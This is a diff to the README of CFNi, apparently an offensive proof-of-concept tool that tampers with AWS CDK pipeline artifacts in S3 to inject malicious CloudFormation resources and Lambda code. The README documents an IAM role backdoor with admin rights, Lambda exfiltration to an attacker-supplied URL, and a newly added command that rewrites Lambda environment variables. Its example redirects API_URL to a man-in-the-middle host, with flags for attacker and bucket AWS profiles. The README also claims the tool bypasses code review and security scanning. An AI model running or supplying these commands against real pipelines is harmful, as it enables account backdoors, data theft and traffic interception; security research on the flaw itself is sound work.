@@ -1,7 +1,7 @@
 # CFNi - Cloudformation injection
 ![Build Status](https://github.com/hupe1980/cfni/workflows/build/badge.svg) 
 [![Go Reference](https://pkg.go.dev/badge/github.com/hupe1980/cfni.svg)](https://pkg.go.dev/github.com/hupe1980/cfni)
-> CFNi is a proof-of-concept to demonstrate an attack on the populare aws cdk pipeline. It takes advantage of the fact that between the "synth" step and the use of the cloudformation templates and lambda assets some time passes ("SelfMutate") and no integrity check is performed by default. After receiving an event from s3, the lambda function injects the malicious code/resources into the generated files. SAST/DAST controls and pull request reviews are bypassed and other accounts can also be attacked if the pipeline supports crossaccount deployments.
+> CFNi is a proof-of-concept to demonstrate an attack on the populare aws cdk pipeline. It takes advantage of the fact that between the "Synth" step and the use of the cloudformation templates and lambda assets some time passes ("SelfMutate") and no integrity check is performed by default. After receiving an event from s3, the lambda function injects the malicious code/resources into the generated files. SAST/DAST controls and pull request reviews are bypassed and other accounts can also be attacked if the pipeline supports crossaccount deployments.
 
 :warning: This is for educational purpose. Don't try it without permission!
 
@@ -23,6 +23,7 @@ The relevant bucket can be found in the build project (Synth) under artifacts up
 The proof-of-concept currently supports the following attacks:
 - [IAM Role Backdoor](#iam-role-backdoor)
 - [Lamda Exfiltration](#lambda-exfiltration)
+- [Lamda Set Envs](#lambda-set-envs)
 
 ### IAM Role Backdoor
 Adds a role with admin permissions.
@@ -74,6 +75,34 @@ Flags:
       --stack strings                 filter stacks (default all stacks)
       --stage strings                 filter stages (default all stages)
   -u, --url string                    exfiltration url (required)
+
+Global Flags:
+      --attacker-profile string   attacker AWS profile
+      --attacker-region string    attacker AWS region
+      --bucket-profile string     bucket AWS profile
+  -A, --user-agent string         user-agent to use for sdk calls (default "cfni")
+```
+
+### Lambda Set Envs
+Sets lambda environment variables.
+
+```
+Usage:
+  cfni lambda-set-envs [flags]
+
+Examples:
+cfni lambda-set-envs --attacker-profile ap --bucket-profile bp --bucket pipeline-bucket --s3-access-key-id AKIAXXX --s3-secret-access-key Ey123XXX --env API_URL=https://mitm.org
+
+Flags:
+  -b, --bucket string                 bucket name (required)
+      --env stringToString            lambda environment variable (required)
+      --environment strings           filter environments (default all environments)
+  -h, --help                          help for lambda-set-envs
+      --s3-access-key-id string       s3 access key id
+      --s3-secret-access-key string   s3 secret access key
+      --s3-session-token string       s3 session token
+      --stack strings                 filter stacks (default all stacks)
+      --stage strings                 filter stages (default all stages)
 
 Global Flags:
       --attacker-profile string   attacker AWS profile
